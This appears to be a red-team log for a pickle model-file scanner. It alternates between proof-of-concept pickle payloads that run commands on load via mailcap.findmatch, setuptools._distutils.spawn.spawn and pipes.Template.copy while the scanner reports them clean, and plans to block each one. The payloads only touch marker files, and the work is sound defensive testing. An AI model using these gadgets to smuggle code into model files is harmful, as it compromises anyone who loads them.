# Picklescan RCE Bypass Game

## Turn 1 - `mailcap.findmatch` policy gap

Goal: produce an RCE-capable pickle that `packages/modelaudit-picklescan`
does not flag.

Payload shape:

```python
import mailcap


class MailcapFindmatchRce:
    def __reduce__(self):
        caps = {
            "text/plain": [
                {
                    "view": "cat %s",
                    "test": "touch /tmp/modelaudit_mailcap_findmatch_rce_marker",
                }
            ]
        }
        return (mailcap.findmatch, (caps, "text/plain", "view", "/tmp/modelaudit-safe-input", []))
```

Proof on CPython 3.12.12:

- Scanner result: `status=complete`, `verdict=clean`, `findings=[]`
- Unpickle result: creates `/tmp/modelaudit_mailcap_findmatch_rce_marker`
- RCE mechanism: `mailcap.findmatch()` evaluates the attacker-controlled
  mailcap `test` command with `os.system()` before returning a viewer command.

Performance note: this is a policy-table miss, not an opcode-analysis miss.
Blocking it should be a constant-time lookup change in `policy.rs` plus a
regression in the adversarial oracle corpus.

## Turn 2 - Block `mailcap.findmatch`

Blocking plan:

- Add `("mailcap", "findmatch")` to the sorted dangerous-global table.
- Add policy coverage so raw `GLOBAL mailcap findmatch` reductions are
  classified as malicious even on Python versions where `mailcap` has been
  removed.
- Add a CPython oracle regression that builds the exact marker-file payload on
  Python versions with `mailcap` and verifies both scanner detection and
  runtime execution.

Performance note: the fix preserves the existing `binary_search_by()` lookup
path and adds one table entry, so hot-path cost remains O(log n) with no extra
payload scanning.

## Turn 3 - `setuptools._distutils.spawn.spawn` namespace gap

Goal: produce another RCE-capable pickle that
`packages/modelaudit-picklescan` does not flag.

Payload shape:

```python
import setuptools._distutils.spawn as dist_spawn


class SetuptoolsDistutilsSpawnRce:
    def __reduce__(self):
        return (dist_spawn.spawn, (["/usr/bin/touch", "/tmp/ma_sdu_marker"],))
```

Proof with CPython 3.12.12 plus `setuptools` installed:

- Scanner result: `status=complete`, `verdict=clean`, `findings=[]`
- Unpickle result: creates `/tmp/ma_sdu_marker`
- RCE mechanism: `setuptools._distutils.spawn.spawn()` directly calls
  `subprocess.check_call(cmd, ...)` with an attacker-controlled command list.

Why the scanner missed it:

- The policy wildcards `distutils`, but Python packaging environments commonly
  expose the compatibility namespace `setuptools._distutils`.
- `global_severity()` checks exact wildcard modules and the top-level module
  only, so `setuptools._distutils.spawn.spawn` does not inherit the existing
  `distutils` wildcard.

Performance note: this is another policy-table miss. The narrow next block is a
sorted `DANGEROUS_GLOBALS` entry for
`("setuptools._distutils.spawn", "spawn")`, which preserves the existing
O(log n) lookup and avoids broad `setuptools` false positives.

## Turn 4 - Block `setuptools._distutils.spawn.spawn`

Blocking plan:

- Add `("setuptools._distutils.spawn", "spawn")` to the sorted
  dangerous-global table instead of wildcarding all `setuptools`.
- Add portable policy coverage for raw `GLOBAL setuptools._distutils.spawn
  spawn` reductions so detection does not depend on `setuptools` being
  installed in the test environment.
- Add an optional CPython oracle regression that imports
  `setuptools._distutils.spawn` when available, verifies scanner detection, then
  verifies runtime marker-file execution.

Performance note: the block is a single additional binary-search entry. It does
not add any module-prefix expansion or extra payload walking.

## Turn 5 - `pipes.Template.copy` pipeline execution gap

Goal: produce another RCE-capable pickle that
`packages/modelaudit-picklescan` does not flag.

Payload shape:

```python
import pipes


class PipesTemplateCopyRce:
    def __reduce__(self):
        template = pipes.Template()
        template.append("touch /tmp/ma_pipes_marker; cat $IN > $OUT", "ff")
        return (pipes.Template.copy, (template, "/dev/null", "/tmp/ma_pipes_out"))
```

Proof on CPython 3.12.12:

- Scanner result: `status=complete`, `verdict=clean`, `findings=[]`
- Unpickle result: creates `/tmp/ma_pipes_marker` and
  `/tmp/ma_pipes_out`
- RCE mechanism: `pipes.Template.copy()` calls
  `os.system(self.makepipeline(infile, outfile))`; the pickled `Template`
  instance carries attacker-controlled `steps`, so the final pipeline is
  attacker-controlled shell syntax.

Why the scanner missed it:

- `pipes` is absent from both `DANGEROUS_WILDCARD_MODULES` and
  `DANGEROUS_GLOBALS`.
- The callable is reached as the dotted global `pipes.Template.copy`; protocol
  4 dotted-name resolution avoids any separately flagged helper such as
  `builtins.getattr`.
- The command string can avoid existing suspicious string literals such as
  `os.system`, `subprocess`, or `eval`.

Performance note: this is a policy coverage gap. The exact scanner key for the
proof is `("pipes", "Template.copy")`, because protocol 4 dotted globals keep
the module as `pipes` and the attribute path as `Template.copy`.

## Turn 6 - Block `pipes.Template` pipeline methods

Blocking plan:

- Add explicit dangerous-global entries for `pipes.Template.copy`,
  `pipes.Template.open`, `pipes.Template.open_r`, and `pipes.Template.open_w`.
  These methods all execute pipeline commands via `os.system()` or `os.popen()`
  when a pickled `Template` carries attacker-controlled `steps`.
- Add portable policy coverage for all four raw global reductions so detection
  does not depend on the deprecated `pipes` module being available.
- Add an optional CPython oracle regression for the proven
  `pipes.Template.copy` marker-file payload when `pipes` is available.

Performance note: the block adds four sorted binary-search entries and no new
payload scanning or module-prefix expansion.
